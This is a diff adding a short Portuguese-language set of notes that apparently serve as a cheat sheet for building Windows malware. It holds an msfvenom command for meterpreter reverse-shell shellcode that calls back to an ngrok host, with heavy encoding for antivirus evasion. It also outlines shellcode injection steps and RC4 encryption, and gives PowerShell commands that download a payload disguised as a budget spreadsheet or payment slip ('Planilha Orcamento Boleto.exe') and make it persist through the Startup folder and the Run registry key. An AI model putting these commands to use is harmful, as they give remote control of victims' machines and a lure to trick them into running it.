@@ -1,0 +1,41 @@
+msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=0.tcp.sa.ngrok.io LPORT=18796 -e x64/zutto_dekiru -i 38 -f c
+
+ msfvenom -p windows/x64/messagebox TEXT="Processo injetado na memoria! O anti-virus nao me detectou, isso e uma falha de seguranca." TITLE="Marlon" -f c -a x64
+
+
+ CODIGO EM C# -> WINDOWS API -> PROCESS INJECTION -> OBFUSCATION -> ENCRYPTATION -> ANTI-DEBUGGING -> PACKERS
+
+CRIPTOGRAFIA DO SHELLCODE RC4
+
+
+1 passo - Alocar memoria
+
+2 passo - Copiar o shellcode na memoria
+
+3 passo - Executar o shellcode
+
+---
+
+Move-Item -Path "$env:USERPROFILE\Downloads\Planilha Orcamento Boleto.exe" -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+COMANDO COLOCAR O ARQUIVO NO INICAR COM WINDOWS, ATRAVES DO POWERSHELL (NÃO REQUER ADMIN)
+
+---
+
+New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'MeuPrograma' -Value 'C:\Caminho\Para\Seu\Programa.exe' -PropertyType String
+
+COMANDO COLOCAR O ARQUIVO NO INICAR COM WINDOWS, ATRAVES DO REGEDIT (NÃO REQUER ADMIN)
+
+---
+
+Invoke-WebRequest -Uri "http://192.168.1.6/Planilha Orcamento Boleto.exe" -OutFile "$Env:UserProfile\Documents\WindowsPowerShell\Planilha Orcamento Boleto.exe"
+
+BAIXAR UM ARQUIVO PELO POWER SHELL (NÃO REQUER ADMIN)
+
+---
+
+quando ele for executado ele cria uma copia dele mesmo e coloca em uma pasta aleatoria no temp
+o objetivo e colocar esse novo executavel como habilitado para iniciar com o sistema para criar 
+persistencia
+
+https://youtu.be/2601C2RXUgM?t=335
